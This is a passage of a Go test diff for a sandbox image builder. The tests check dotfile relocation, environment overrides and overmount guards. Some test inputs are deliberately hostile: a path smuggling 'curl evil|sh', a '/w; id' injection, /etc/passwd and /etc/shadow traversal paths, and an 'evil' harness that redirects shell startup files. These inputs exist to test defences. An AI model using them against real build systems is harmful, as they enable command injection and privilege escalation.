@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"errors"
 	"os"
+	"slices"
 	"strings"
 	"testing"
 	"testing/fstest"
@@ -19,6 +20,7 @@ import (
 	"github.com/rhuss/sandcast/internal/policy"
 	"github.com/rhuss/sandcast/internal/probe"
 	"github.com/rhuss/sandcast/internal/profile"
+	"github.com/rhuss/sandcast/internal/shell"
 	"github.com/rhuss/sandcast/internal/testutil"
 )
 
@@ -73,9 +75,9 @@ func testProbe(wanted []Wanted) *probe.Result {
 		}
 		checks[w.Key] = probe.CheckResult{ComponentKey: w.Key, Status: status, Version: version}
 	}
-	// The base image ships an older starship outside the workspace path
+	// The base image ships an older starship outside the overmount home
 	// (shadowed by the locked version) and a go that lives only under the
-	// workspace path (installed).
+	// overmount home (installed).
 	if _, ok := checks["starship"]; ok {
 		checks["starship"] = probe.CheckResult{ComponentKey: "starship", Status: probe.StatusPresent, Version: "1.20.0",
 			Path: "/usr/bin/starship", Paths: []string{"/usr/bin/starship"}}
@@ -125,6 +127,31 @@ func testInputs(t *testing.T, m *manifest.Manifest, stored map[string]StoredFrag
 		StoredFragments: stored,
 		Notices:         notices,
 	}
+}
+
+// TestBuildOvermountHomeNoticeAndRefusal checks a base image overmount home
+// other than /sandbox is recorded with a notice that it is the WORKDIR the
+// OpenShell podman driver mounts over, not what the Kubernetes driver uses,
+// and that a system directory is refused by the one registry rule.
+func TestBuildOvermountHomeNoticeAndRefusal(t *testing.T) {
+	in := testInputs(t, testManifest(), nil)
+	in.BaseImage.OvermountHome = "/workspace"
+	p, err := Build(in)
+	require.NoError(t, err)
+	assert.Equal(t, "/workspace", p.BaseImage.OvermountHome)
+	joined := strings.Join(p.Notices, "\n")
+	assert.Contains(t, joined, "base image overmount home /workspace is not /sandbox")
+	assert.Contains(t, joined, "podman driver only")
+
+	p, err = Build(testInputs(t, testManifest(), nil))
+	require.NoError(t, err)
+	assert.NotContains(t, strings.Join(p.Notices, "\n"), "overmount home", "the default needs no notice")
+
+	in = testInputs(t, testManifest(), nil)
+	in.BaseImage.OvermountHome = "/etc"
+	_, err = Build(in)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), `base image overmount_home "/etc" is a system directory`)
 }
 
 func TestBuildDeterministicAndGolden(t *testing.T) {
@@ -183,9 +210,36 @@ func TestBuildContent(t *testing.T) {
 	assert.Contains(t, p.Policy, "/opt/go")
 	assert.Contains(t, p.Policy, "run_as_user: sandbox")
 	assert.Equal(t, ZshRCPath, p.Shell.RCPath)
-	assert.Equal(t, []EnvVar{{Name: "GOPATH", Value: "/opt/go"}}, p.Image.Env)
+	// The relocation env sets ZDOTDIR image-wide for the zsh shell (R3),
+	// merged with the component env and sorted by name.
+	assert.Equal(t, []EnvVar{{Name: "GOPATH", Value: "/opt/go"}, {Name: "ZDOTDIR", Value: ZDotDir}}, p.Image.Env)
 	assert.Equal(t, []Dir{{Path: "/opt/go", Owner: "user"}}, p.Image.Dirs)
 	assert.False(t, p.FinalUser.Created)
+}
+
+// TestPolicyGrantsRelocationPrefix checks the OpenShell image policy grants
+// read access to /opt/sandcast for every shell kind. The upstream default
+// policy covers nothing under /opt, so without this grant landlock denies the
+// sandbox user the baked rc files and the launchers that are its login shell
+// and CMD (verified under a real gateway: "cat /opt/sandcast/bashrc:
+// Permission denied").
+func TestPolicyGrantsRelocationPrefix(t *testing.T) {
+	bash := testManifest()
+	bash.Shell = &manifest.Shell{Program: "bash", RC: "alias ll='ls -l'\n"}
+	none := testManifest()
+	none.Shell = nil
+	for name, m := range map[string]*manifest.Manifest{"zsh": testManifest(), "bash": bash, "no shell": none} {
+		p, err := Build(testInputs(t, m, nil))
+		require.NoError(t, err, name)
+		var doc struct {
+			FilesystemPolicy struct {
+				ReadOnly []string `yaml:"read_only"`
+			} `yaml:"filesystem_policy"`
+		}
+		require.NoError(t, yaml.Unmarshal([]byte(p.Policy), &doc), name)
+		assert.Contains(t, doc.FilesystemPolicy.ReadOnly, RelocationPrefix, "%s: the policy grants the baked shell configuration", name)
+		require.NoError(t, policy.Validate([]byte(p.Policy)), name)
+	}
 }
 
 func TestBuildConflicts(t *testing.T) {
@@ -375,8 +429,8 @@ func TestValidateRejectsUnsafeFinalUser(t *testing.T) {
 	assert.Contains(t, err.Error(), "final_user.group")
 }
 
-// policyPaths decodes the filesystem paths of a rendered policy.
-func policyPaths(t *testing.T, doc string) (readOnly, readWrite []string) {
+// renderedPolicyPaths decodes the filesystem paths of a rendered policy.
+func renderedPolicyPaths(t *testing.T, doc string) (readOnly, readWrite []string) {
 	t.Helper()
 	var d struct {
 		FilesystemPolicy struct {
@@ -405,7 +459,7 @@ func TestBuildFragmentGrantsOptKey(t *testing.T) {
 	require.NoError(t, err)
 	require.Equal(t, KindFragment, p.Component("broken-tool").InstallerKind)
 	require.Equal(t, KindFragment, p.Component("zsh").InstallerKind)
-	ro, rw := policyPaths(t, p.Policy)
+	ro, rw := renderedPolicyPaths(t, p.Policy)
 	assert.Contains(t, ro, "/opt/broken-tool", "fragment without a definition")
 	assert.Contains(t, ro, "/opt/zsh", "fragment for an unresolvable definition")
 	assert.NotContains(t, rw, "/opt/broken-tool")
@@ -550,6 +604,388 @@ func TestWriteOutputs(t *testing.T) {
 	assert.Equal(t, p.Target, loaded.Target)
 }
 
+func TestRelocationEnvForZshAndBash(t *testing.T) {
+	zsh := &Plan{Shell: Shell{Program: "zsh"}}
+	assert.Equal(t, []EnvVar{{Name: "ZDOTDIR", Value: ZDotDir}}, RelocationEnv(zsh))
+	// bash relocates through the launcher, not an env var, so no ZDOTDIR.
+	bash := &Plan{Shell: Shell{Program: "bash"}}
+	assert.Empty(t, RelocationEnv(bash))
+	// per-dotfile env is merged and sorted.
+	zsh.Dotfiles = []DotfileSelection{{Env: map[string]string{"STARSHIP_CONFIG": "/etc/xdg/starship.toml"}}}
+	assert.Equal(t, []EnvVar{
+		{Name: "STARSHIP_CONFIG", Value: "/etc/xdg/starship.toml"},
+		{Name: "ZDOTDIR", Value: ZDotDir},
+	}, RelocationEnv(zsh))
+}
+
+// TestRelocationEnvWinsOverComponentEnv checks a component or harness cannot
+// point a relocation variable back into the overmounted home: the relocation
+// value wins, the override is reported, and a startup-file variable whose
+// final value lies under the home fails the plan.
+func TestRelocationEnvWinsOverComponentEnv(t *testing.T) {
+	in := testInputs(t, testManifest(), nil)
+	in.Harnesses = []Harness{{
+		Name: "evil", Component: "evil", FragmentName: SectionHarness + "/evil", Fragment: "# 70-harness: evil\nUSER root\n",
+		Env: []EnvVar{{Name: "ZDOTDIR", Value: DefaultOvermountHome}, {Name: "STARSHIP_CONFIG", Value: DefaultOvermountHome + "/.config/starship.toml"}},
+	}}
+	in.Dotfiles = []DotfileInput{{HostPath: "~/.config/starship.toml", Content: "add_newline = false\n", FromAllowlist: true}}
+	p, err := Build(in)
+	require.NoError(t, err)
+	env := map[string]string{}
+	for _, e := range p.Image.Env {
+		env[e.Name] = e.Value
+	}
+	assert.Equal(t, ZDotDir, env["ZDOTDIR"], "the relocation value wins")
+	assert.False(t, UnderOvermount(DefaultOvermountHome, env["STARSHIP_CONFIG"]), "STARSHIP_CONFIG stays out of the home: %s", env["STARSHIP_CONFIG"])
+	var reported int
+	for _, n := range p.Notices {
+		if strings.Contains(n, "replaced by the relocation value") {
+			reported++
+		}
+	}
+	assert.Equal(t, 2, reported, "each override is reported: %v", p.Notices)
+
+	// A startup-file variable that sandcast does not relocate but that would
+	// make a shell source a workspace file fails the plan.
+	for _, name := range []string{"BASH_ENV", "ENV"} {
+		bad := testInputs(t, testManifest(), nil)
+		bad.Harnesses = []Harness{{
+			Name: "evil", Component: "evil", FragmentName: SectionHarness + "/evil", Fragment: "# 70-harness: evil\nUSER root\n",
+			Env: []EnvVar{{Name: name, Value: DefaultOvermountHome + "/.bashenv"}},
+		}}
+		_, err := Build(bad)
+		require.Error(t, err, name)
+		assert.Contains(t, err.Error(), name)
+		assert.Contains(t, err.Error(), DefaultOvermountHome)
+	}
+
+	// A guarded value the shell expands at run time ($HOME, ~) names a
+	// workspace file without starting with the overmount home, so only a
+	// plain absolute path passes; an unguarded variable (TOOL_HOME, and
+	// INPUTRC while no dotfile relocates it) may carry anything.
+	for name, value := range map[string]string{"BASH_ENV": "$HOME/.bashrc", "ENV": "~/.shrc", "ZDOTDIR": "${HOME}"} {
+		bad := testInputs(t, testManifest(), nil)
+		bad.Harnesses = []Harness{{
+			Name: "evil", Component: "evil", FragmentName: SectionHarness + "/evil", Fragment: "# 70-harness: evil\nUSER root\n",
+			Env: []EnvVar{{Name: name, Value: value}, {Name: "TOOL_HOME", Value: "$HOME/.tool"}, {Name: "INPUTRC", Value: "~/.inputrc"}},
+		}}
+		_, err := Build(bad)
+		if name == "ZDOTDIR" {
+			// The relocation value replaces it before the guard runs.
+			require.NoError(t, err, name)
+			continue
+		}
+		require.Error(t, err, name)
+		assert.Contains(t, err.Error(), name+"="+value, name)
+		assert.Contains(t, err.Error(), "not a plain absolute path", name)
+	}
+}
+
+// TestRelocateDotfileNoImageWideXDG checks no dotfile sets XDG_CONFIG_HOME:
+// an image-wide value pointing at a root-owned tree made every tool that
+// writes its configuration there (gh, helm, glab) fail with EACCES. tmux
+// goes to /etc/tmux.conf, which tmux reads natively, generic files to
+// /etc/xdg (in the default XDG_CONFIG_DIRS), and only tool-specific
+// variables remain.
+func TestRelocateDotfileNoImageWideXDG(t *testing.T) {
+	for _, tt := range []struct {
+		host, target string
+		env          map[string]string
+	}{
+		{"~/.gitconfig", GitConfigPath, nil},
+		{"~/.config/git/config", GitConfigPath, nil},
+		{"~/.config/starship.toml", XDGConfigDir + "/starship.toml", map[string]string{"STARSHIP_CONFIG": XDGConfigDir + "/starship.toml"}},
+		{"~/.tmux.conf", TmuxConfPath, nil},
+		{"~/.config/tmux/tmux.conf", TmuxConfPath, nil},
+		{"~/.inputrc", InputRCPath, map[string]string{"INPUTRC": InputRCPath}},
+		{"~/.config/ghostty/config", XDGConfigDir + "/ghostty/config", nil},
+		{"conf/tool.conf", XDGConfigDir + "/conf/tool.conf", nil},
+		{".editorconfig", XDGConfigDir + "/editorconfig", nil},
+		{"./rel.conf", XDGConfigDir + "/rel.conf", nil},
+		{"/abs/extra.conf", XDGConfigDir + "/abs/extra.conf", nil},
+		{"~/.config/nvim/init.lua", XDGConfigDir + "/nvim/init.lua", nil},
+		{"dots/.config/git/config", GitConfigPath, nil},
+		{"dots/gitconfig", GitConfigPath, nil},
+		{"conf/inputrc", InputRCPath, map[string]string{"INPUTRC": InputRCPath}},
+		// A project or absolute copy that keeps the .config/ layout lands
+		// where XDG consumers search, like the home original would.
+		{"dotfiles/.config/nvim/init.lua", XDGConfigDir + "/nvim/init.lua", nil},
+		{"/work/p/dotfiles/.config/nvim/lua/plugins.lua", XDGConfigDir + "/nvim/lua/plugins.lua", nil},
+		{"./dotfiles/.config/ghostty/config", XDGConfigDir + "/ghostty/config", nil},
+		{"dots/.configs/x.conf", XDGConfigDir + "/dots/.configs/x.conf", nil},
+	} {
+		target, env := relocateDotfile(tt.host)
+		assert.Equal(t, tt.target, target, tt.host)
+		assert.Equal(t, tt.env, env, tt.host)
+		assert.NotContains(t, env, "XDG_CONFIG_HOME", tt.host)
+	}
+}
+
+// TestResolveDotfilesInputrcIncludesSystemDefaults checks the baked inputrc
+// keeps the system readline defaults: INPUTRC replaces /etc/inputrc as well
+// as ~/.inputrc, so the baked file starts with an include of /etc/inputrc.
+func TestResolveDotfilesInputrcIncludesSystemDefaults(t *testing.T) {
+	sels, _, _ := resolveDotfiles([]DotfileInput{{HostPath: "~/.inputrc", Content: "set editing-mode vi\n"}})
+	require.Len(t, sels, 1)
+	assert.Equal(t, "$include /etc/inputrc\nset editing-mode vi\n", sels[0].Content)
+	again, _, _ := resolveDotfiles([]DotfileInput{{HostPath: "~/.inputrc", Content: sels[0].Content}})
+	assert.Equal(t, sels[0].Content, again[0].Content, "an existing include is not doubled")
+}
+
+// TestResolveDotfilesRejectsDotSegments checks a host path with ".." cannot
+// produce a target that escapes the relocation tree: a character class
+// alone accepts "." and ".." segments, so shell.SafeAbsPath rejects them
+// .
+func TestResolveDotfilesRejectsDotSegments(t *testing.T) {
+	sels, _, extra := resolveDotfiles([]DotfileInput{
+		{HostPath: "~/../../../../etc/passwd", Content: "root::0:0::/:/bin/sh\n"},
+		{HostPath: "~/.config/../../x/../../etc/shadow", Content: "x\n"},
+	})
+	assert.Empty(t, sels, "no traversal target is baked")
+	assert.Len(t, extra, 2, "%v", extra)
+	for _, n := range extra {
+		assert.Contains(t, n, "unsafe image path")
+	}
+}
+
+func TestResolveDotfilesDeterministicAndDedup(t *testing.T) {
+	inputs := []DotfileInput{
+		{HostPath: "~/.tmux.conf", Content: "set -g mouse on\n", FromAllowlist: true},         // -> /etc/tmux.conf (allowlist)
+		{HostPath: "~/.config/tmux/tmux.conf", Content: "set -g history-limit 5\n"},           // also -> /etc/tmux.conf (explicit)
+		{HostPath: "~/.gitconfig", Content: "[user]\n\temail = a@b.c\n", FromAllowlist: true}, // -> /etc/gitconfig
+	}
+	sels, notices, dedup := resolveDotfiles(inputs)
+	var targets []string
+	for _, s := range sels {
+		targets = append(targets, s.RelocatedTo)
+	}
+	assert.Equal(t, []string{GitConfigPath, TmuxConfPath}, targets, "sorted by relocated_to")
+	// The explicit manifest entry wins the /etc/tmux.conf collision: tmux
+	// reads only one of its two files.
+	assert.Equal(t, "~/.config/tmux/tmux.conf", sels[1].HostPath)
+	assert.Equal(t, DotfileSourceManifest, sels[1].Source)
+	assert.Equal(t, []string{"dotfiles ~/.tmux.conf and ~/.config/tmux/tmux.conf both relocate to /etc/tmux.conf; ~/.config/tmux/tmux.conf is used (manifest source wins)"}, dedup)
+	assert.Equal(t, []RelocationNotice{
+		{Kind: NoticeRelocated, Subject: "~/.gitconfig", To: GitConfigPath},
+		{Kind: NoticeRelocated, Subject: "~/.config/tmux/tmux.conf", To: TmuxConfPath},
+	}, notices, "one relocated notice per baked dotfile, without a from that repeats the subject")
+	sels2, _, dedup2 := resolveDotfiles(inputs)
+	assert.Equal(t, sels, sels2, "deterministic")
+	assert.Equal(t, dedup, dedup2)
+}
+
+// TestDedupDotfilesTieBreak checks the dedup winner does not depend on the
+// input order: an explicit entry beats an allowlist proposal, and between
+// two entries of the same source the smaller host path wins.
+func TestDedupDotfilesTieBreak(t *testing.T) {
+	a := DotfileSelection{Source: DotfileSourceManifest, HostPath: "conf/a.conf"}
+	b := DotfileSelection{Source: DotfileSourceManifest, HostPath: "conf/b.conf"}
+	allow := DotfileSelection{Source: DotfileSourceAllowlist, HostPath: "~/.a"}
+	assert.Equal(t, a, dedupDotfiles(a, b))
+	assert.Equal(t, a, dedupDotfiles(b, a), "reversed input order")
+	assert.Equal(t, a, dedupDotfiles(allow, a), "explicit wins over allowlist")
+	assert.Equal(t, a, dedupDotfiles(a, allow), "explicit wins over allowlist, reversed")
+
+	in := []DotfileInput{{HostPath: "~/.tmux.conf", Content: "one\n"}, {HostPath: "~/.config/tmux/tmux.conf", Content: "two\n"}}
+	fwd, _, _ := resolveDotfiles(in)
+	rev, _, _ := resolveDotfiles([]DotfileInput{in[1], in[0]})
+	assert.Equal(t, fwd, rev, "the same winner for either input order")
+	assert.Equal(t, "~/.config/tmux/tmux.conf", fwd[0].HostPath, "the smaller host path wins between two explicit entries")
+}
+
+// TestResolveDotfilesMergesGitConfig checks git's two configuration files
+// are both kept: git reads ~/.config/git/config and then ~/.gitconfig, so
+// they are concatenated into /etc/gitconfig in that order (the ~/.gitconfig
+// values win) instead of one being dropped. A second
+// ~/.gitconfig-style entry is still deduplicated.
+func TestResolveDotfilesMergesGitConfig(t *testing.T) {
+	inputs := []DotfileInput{
+		{HostPath: "~/.gitconfig", Content: "[user]\n\temail = global@example.com", FromAllowlist: true},
+		{HostPath: "~/.config/git/config", Content: "[user]\n\temail = xdg@example.com\n[core]\n\tpager = less\n", FromAllowlist: true},
+		{HostPath: "dotfiles/gitconfig", Content: "[user]\n\tname = other\n"},
+	}
+	sels, notices, extra := resolveDotfiles(inputs)
+	require.Len(t, sels, 1)
+	got := sels[0]
+	assert.Equal(t, GitConfigPath, got.RelocatedTo)
+	assert.Equal(t, "dotfiles/gitconfig", got.HostPath, "the explicit entry wins the ~/.gitconfig slot")
+	assert.Equal(t, []string{"~/.config/git/config"}, got.MergedFrom)
+	assert.Equal(t, "# sandcast: from ~/.config/git/config\n[user]\n\temail = xdg@example.com\n[core]\n\tpager = less\n"+
+		"# sandcast: from dotfiles/gitconfig\n[user]\n\tname = other\n", got.Content)
+	assert.Equal(t, []RelocationNotice{
+		{Kind: NoticeRelocated, Subject: "~/.config/git/config", To: GitConfigPath},
+		{Kind: NoticeRelocated, Subject: "dotfiles/gitconfig", To: GitConfigPath},
+	}, notices, "every baked source is reported")
+	assert.Contains(t, extra, "dotfiles ~/.config/git/config and dotfiles/gitconfig are both git configuration; they are merged into /etc/gitconfig in git's order, dotfiles/gitconfig last so its values win")
+	assert.Contains(t, extra, "dotfiles ~/.gitconfig and dotfiles/gitconfig both relocate to /etc/gitconfig; dotfiles/gitconfig is used (manifest source wins)")
+
+	// A project copy that keeps the XDG layout is git's XDG file too; a
+	// missing final newline does not glue the parts together.
+	sels, _, _ = resolveDotfiles([]DotfileInput{
+		{HostPath: "dots/.gitconfig", Content: "[a]\n\tb = 1"},
+		{HostPath: "dots/.config/git/config", Content: "[a]\n\tb = 0"},
+	})
+	require.Len(t, sels, 1)
+	assert.Equal(t, "# sandcast: from dots/.config/git/config\n[a]\n\tb = 0\n# sandcast: from dots/.gitconfig\n[a]\n\tb = 1\n", sels[0].Content)
+}
+
+func TestResolveDotfilesRedactsCredential(t *testing.T) {
+	token := "ghp_" + strings.Repeat("x", 36)
+	inputs := []DotfileInput{{HostPath: "~/.gitconfig", Content: "[github]\n\ttoken = " + token + "\n"}}
+	sels, _, _ := resolveDotfiles(inputs)
+	require.Len(t, sels, 1)
+	assert.NotContains(t, sels[0].Content, token, "the credential is redacted")
+	assert.Contains(t, sels[0].Content, "SANDCAST_SECRET")
+}
+
+func TestBuildReprovisionsOvermountTool(t *testing.T) {
+	in := testInputs(t, testManifest(), nil)
+	// git is present, but only under the overmounted home: it must be
+	// reclassified as missing and re-provisioned (FR-009).
+	in.Probe.Checks["git"] = probe.CheckResult{ComponentKey: "git", Status: probe.StatusPresent, Version: "2.43.0", Path: "/sandbox/.local/bin/git"}
+	p, err := Build(in)
+	require.NoError(t, err)
+	assert.Equal(t, ActionInstall, p.Component("git").Action, "reclassified from present to install")
+	var found *RelocationNotice
+	for i := range p.Relocations {
+		if p.Relocations[i].Kind == NoticeReprovisioned && p.Relocations[i].Subject == "git" {
+			found = &p.Relocations[i]
+		}
+	}
+	require.NotNil(t, found, "a reprovisioned notice for git: %v", p.Relocations)
+	assert.Equal(t, "/sandbox/.local/bin/git", found.From)
+	assert.Equal(t, "/usr", found.To)
+	// The notices are sorted by subject deterministically.
+	in2 := testInputs(t, testManifest(), nil)
+	in2.Probe.Checks["git"] = in.Probe.Checks["git"]
+	p2, err := Build(in2)
+	require.NoError(t, err)
+	assert.Equal(t, p.Relocations, p2.Relocations)
+}
+
+func TestOvermountGuardRejectsBakedPathUnderHome(t *testing.T) {
+	// A normal zsh plan bakes nothing under the home.
+	ok := &Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "zsh", RCPath: ZshRCPath}}
+	require.NoError(t, checkOvermountGuard(ok, DefaultOvermountHome, nil))
+	// A dotfile target under the home is caught; the guard is the one
+	// overmount check for dotfile targets.
+	bad := &Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "zsh"},
+		Dotfiles: []DotfileSelection{{HostPath: "~/.gitconfig", RelocatedTo: DefaultOvermountHome + "/.gitconfig"}}}
+	err := checkOvermountGuard(bad, DefaultOvermountHome, nil)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "dotfile ~/.gitconfig")
+	assert.Contains(t, err.Error(), DefaultOvermountHome)
+	// The container target has no overmount, so the guard never fires.
+	require.NoError(t, checkOvermountGuard(bad, "", nil))
+	// A real relocation target under an overmount prefix that overlaps it
+	// (.gitconfig relocates to /etc/gitconfig, which is under "/etc"). The
+	// plan has no OpenShell hooks under /etc, so the dotfile is what trips.
+	sels, _, _ := resolveDotfiles([]DotfileInput{{HostPath: "~/.gitconfig"}})
+	err = checkOvermountGuard(&Plan{Target: manifest.TargetContainer, Shell: Shell{Program: "bash"}, Dotfiles: sels}, "/etc", nil)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "/etc/gitconfig")
+	// Boundary behavior of the helper the guard uses.
+	assert.True(t, UnderOvermount(DefaultOvermountHome, DefaultOvermountHome+"/.config"))
+	assert.False(t, UnderOvermount(DefaultOvermountHome, XDGConfigDir+"/x"))
+	assert.False(t, UnderOvermount("", DefaultOvermountHome+"/x"), "no overmount prefix means never under it")
+}
+
+// TestOvermountGuardCoversDirsAndPolicyPaths checks the guard covers every
+// path the plan bakes or declares, not only the shell files and dotfiles: a
+// component or harness directory under the home would be created by the
+// 20-user section and then hidden by the workspace mount, and a policy path
+// there would be a grant on the workspace. The overmount home
+// itself, the workspace directory, stays allowed.
+func TestOvermountGuardCoversDirsAndPolicyPaths(t *testing.T) {
+	withGoImage := func(t *testing.T, mutate func(img *component.ImageNeeds)) Inputs {
+		in := testInputs(t, testManifest(), nil)
+		for _, w := range in.Wanted {
+			if w.Key == "go" {
+				mutate(w.Def.Image)
+			}
+		}
+		return in
+	}
+	for name, mutate := range map[string]func(img *component.ImageNeeds){
+		"component dir": func(img *component.ImageNeeds) {
+			img.Dirs = append(img.Dirs, component.Dir{Path: DefaultOvermountHome + "/.cache/tool"})
+		},
+		"component read_write": func(img *component.ImageNeeds) { img.ReadWrite = append(img.ReadWrite, DefaultOvermountHome+"/.cache") },
+		"component read_only": func(img *component.ImageNeeds) {
+			img.ReadOnly = append(img.ReadOnly, DefaultOvermountHome+"/.local/bin")
+		},
+	} {
+		_, err := Build(withGoImage(t, mutate))
+		require.Error(t, err, name)
+		assert.Contains(t, err.Error(), "lies under the overmount home /sandbox", name)
+	}
+	in := testInputs(t, testManifest(), nil)
+	in.Harnesses = []Harness{{
+		Name: "h", Component: "h", FragmentName: SectionHarness + "/h", Fragment: "# 70-harness: h\nUSER root\n",
+		Dirs: []Dir{{Path: DefaultOvermountHome + "/.h", Owner: "user"}},
+	}}
+	_, err := Build(in)
+	require.Error(t, err, "harness dir")
+	assert.Contains(t, err.Error(), DefaultOvermountHome+"/.h (directory of a component or harness)")
+
+	_, err = Build(withGoImage(t, func(img *component.ImageNeeds) {
+		img.Dirs = append(img.Dirs, component.Dir{Path: DefaultOvermountHome})
+	}))
+	require.NoError(t, err, "the workspace directory itself is allowed")
+
+	// The container target is never overmounted.
+	m := testManifest()
+	m.Targets = manifest.Targets{Container: &manifest.Target{Image: "localhost/demo"}}
+	cin := testInputs(t, m, nil)
+	cin.Target = manifest.TargetContainer
+	for _, w := range cin.Wanted {
+		if w.Key == "go" {
+			w.Def.Image.Dirs = append(w.Def.Image.Dirs, component.Dir{Path: DefaultOvermountHome + "/.cache/tool"})
+		}
+	}
+	_, err = Build(cin)
+	require.NoError(t, err)
+}
+
+// TestResolveDotfilesSkipsUnsafeTarget checks that a dotfile whose relocation
+// target would carry shell metacharacters is skipped with a notice rather than
+// baked, so it can never inject into the generated COPY/RUN instructions
+// (spec 003 US3, constitution IV).
+func TestResolveDotfilesSkipsUnsafeTarget(t *testing.T) {
+	inputs := []DotfileInput{
+		{HostPath: "~/.config/x;curl evil|sh;", Content: "x\n"},
+		{HostPath: "~/.gitconfig", Content: "[user]\n", FromAllowlist: true},
+	}
+	sels, _, extra := resolveDotfiles(inputs)
+	// Only the safe .gitconfig is baked.
+	require.Len(t, sels, 1)
+	assert.Equal(t, GitConfigPath, sels[0].RelocatedTo)
+	for _, s := range sels {
+		assert.True(t, shell.SafeAbsPath(s.RelocatedTo), "every baked target is a safe path")
+	}
+	var skipped bool
+	for _, n := range extra {
+		if strings.Contains(n, "unsafe image path") {
+			skipped = true
+		}
+	}
+	assert.True(t, skipped, "the unsafe dotfile is reported as skipped: %v", extra)
+}
+
+func TestReprovisionOnlyForOvermountTarget(t *testing.T) {
+	// A present tool under /sandbox on the container target is NOT reclassified
+	// (the container target has no overmount).
+	m := testManifest()
+	m.Targets = manifest.Targets{Container: &manifest.Target{Image: "localhost/demo"}}
+	in := testInputs(t, m, nil)
+	in.Target = manifest.TargetContainer
+	in.Probe.Checks["git"] = probe.CheckResult{ComponentKey: "git", Status: probe.StatusPresent, Version: "2.43.0", Path: "/sandbox/.local/bin/git"}
+	p, err := Build(in)
+	require.NoError(t, err)
+	assert.Equal(t, ActionSkip, p.Component("git").Action, "container target keeps the present tool")
+	assert.Empty(t, p.Relocations)
+}
+
 func keysOf(us []Unresolved) []string {
 	out := []string{}
 	for _, u := range us {
@@ -569,7 +1005,7 @@ func TestBuildMergesHarnessNeeds(t *testing.T) {
 	}}
 	p, err := Build(in)
 	require.NoError(t, err)
-	assert.Equal(t, []EnvVar{{Name: "CLAUDE_CONFIG_DIR", Value: "/opt/sandcast/claude-code"}, {Name: "GOPATH", Value: "/opt/go"}}, p.Image.Env, "component env wins on a clash")
+	assert.Equal(t, []EnvVar{{Name: "CLAUDE_CONFIG_DIR", Value: "/opt/sandcast/claude-code"}, {Name: "GOPATH", Value: "/opt/go"}, {Name: "ZDOTDIR", Value: ZDotDir}}, p.Image.Env, "component env wins on a clash; relocation ZDOTDIR is added")
 	assert.Contains(t, p.Image.Dirs, Dir{Path: "/opt/sandcast/claude-code", Owner: "user"})
 	assert.Contains(t, p.Policy, "/opt/sandcast/claude-code")
 	require.Len(t, p.Harnesses, 1)
@@ -605,32 +1041,164 @@ func TestSelectAddsGitForHarnessPlugins(t *testing.T) {
 	}
 }
 
+// TestBuildUsesBaseImageOvermountHome checks the overmount home is a
+// property of the base image: a registry entry's overmount_home reaches the
+// plan, which records it and applies it to the re-provisioning and the
+// guard; the OpenShell default is /sandbox, and the container target has
+// none.
+func TestBuildUsesBaseImageOvermountHome(t *testing.T) {
+	in := testInputs(t, testManifest(), nil)
+	in.BaseImage.OvermountHome = "/workspace"
+	in.Probe.Checks["git"] = probe.CheckResult{ComponentKey: "git", Status: probe.StatusPresent, Version: "2.43.0", Path: "/workspace/.local/bin/git"}
+	for _, w := range in.Wanted {
+		if w.Key == "go" {
+			w.Def.Image.Dirs = append(w.Def.Image.Dirs, component.Dir{Path: DefaultOvermountHome + "/.cache/tool"})
+		}
+	}
+	p, err := Build(in)
+	require.NoError(t, err, "a /sandbox path is fine when the workspace is mounted elsewhere")
+	assert.Equal(t, "/workspace", p.BaseImage.OvermountHome)
+	assert.Equal(t, "/workspace", OvermountPrefix(p))
+	assert.Equal(t, ActionInstall, p.Component("git").Action, "a tool only under the overmount home is re-provisioned")
+
+	bad := testInputs(t, testManifest(), nil)
+	bad.BaseImage.OvermountHome = "/workspace"
+	for _, w := range bad.Wanted {
+		if w.Key == "go" {
+			w.Def.Image.Dirs = append(w.Def.Image.Dirs, component.Dir{Path: "/workspace/.cache/tool"})
+		}
+	}
+	_, err = Build(bad)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "lies under the overmount home /workspace")
+
+	def, err := Build(testInputs(t, testManifest(), nil))
+	require.NoError(t, err)
+	assert.Equal(t, DefaultOvermountHome, def.BaseImage.OvermountHome, "the default is recorded")
+
+	m := testManifest()
+	m.Targets = manifest.Targets{Container: &manifest.Target{Image: "localhost/demo"}}
+	cin := testInputs(t, m, nil)
+	cin.Target = manifest.TargetContainer
+	cin.BaseImage.OvermountHome = "/workspace"
+	cp, err := Build(cin)
+	require.NoError(t, err)
+	assert.Empty(t, cp.BaseImage.OvermountHome, "the container target is never overmounted")
+	assert.Empty(t, OvermountPrefix(cp))
+
+	unsafe := testInputs(t, testManifest(), nil)
+	unsafe.BaseImage.OvermountHome = "/w; id"
+	_, err = Build(unsafe)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), `base image overmount_home "/w; id" must be an absolute path`, "the registry rule, with its one message")
+
+	// A plan.yaml written before the field existed reads as the default.
+	old := &Plan{Target: manifest.TargetOpenShell}
+	assert.Equal(t, DefaultOvermountHome, OvermountPrefix(old))
+}
+
+// TestReprovisionTargets checks the persistent location a re-provision
+// notice names for each installer kind: the mise data directory, /usr for a
+// system package, /opt/<key> for a script or fragment (FR-009).
+func TestReprovisionTargets(t *testing.T) {
+	in := testInputs(t, testManifest(), nil)
+	for _, key := range []string{"go", "git", "mytool"} {
+		in.Probe.Checks[key] = probe.CheckResult{ComponentKey: key, Status: probe.StatusPresent, Version: "1.0", Path: DefaultOvermountHome + "/.local/bin/" + key}
+	}
+	p, err := Build(in)
+	require.NoError(t, err)
+	to := map[string]string{}
+	for _, r := range p.Relocations {
+		if r.Kind == NoticeReprovisioned {
+			to[r.Subject] = r.To
+		}
+	}
+	assert.Equal(t, map[string]string{"go": MiseDataDir, "git": "/usr", "mytool": "/opt/mytool"}, to)
+	assert.Contains(t, p.Notices, "component go was found only under /sandbox/.local/bin/go (hidden once the workspace is mounted over the home); it is provisioned to /opt/mise instead")
+}
+
+func TestRelocationNoticeString(t *testing.T) {
+	assert.Equal(t, "~/.gitconfig relocated to /etc/gitconfig so it survives the workspace mount over the home",
+		RelocationNotice{Kind: NoticeRelocated, Subject: "~/.gitconfig", To: GitConfigPath}.String())
+	assert.Equal(t, "component rg was found only under /sandbox/bin/rg (hidden once the workspace is mounted over the home); it is provisioned to /usr instead",
